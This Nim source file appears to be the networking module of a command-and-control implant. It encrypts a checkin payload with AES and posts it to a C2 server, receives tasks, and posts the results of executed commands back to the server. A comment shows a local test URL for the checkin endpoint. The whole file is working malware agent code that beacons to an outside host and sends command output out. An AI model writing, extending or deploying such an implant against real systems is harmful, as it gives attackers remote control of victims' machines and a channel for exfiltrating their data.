import httpclient, json, strformat
import config, crypto
import times
import std/parseutils
import utils
import commands

let client = newHttpClient()
var checkin_payload: JsonNode
proc sendCheckin*(id: string): string =
    
    if CHECKIN_COUNTER == 0:
      checkin_payload = checkin_command(id)          
    
    inc(CHECKIN_COUNTER)
    let key = hexToBytes(AES_KEY)

    let enc = encryptJson(checkin_payload, $key)
    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/api/checkin with enc as body
    #in backend getNextTask(id) -> return the task for the agent as (task_id,cmd)

proc sendTaskResult*(id: string, task_id: string,command: string,output: string): string =
    let payload = %*{
      "agent_id": id,
      "task_id": task_id,
      "command": command,
      "data": output
    }
    let enc = $payload
    return client.postContent(C2_URL & RESULT_URI, enc)

type Task = object
    task_id: string
    command: string

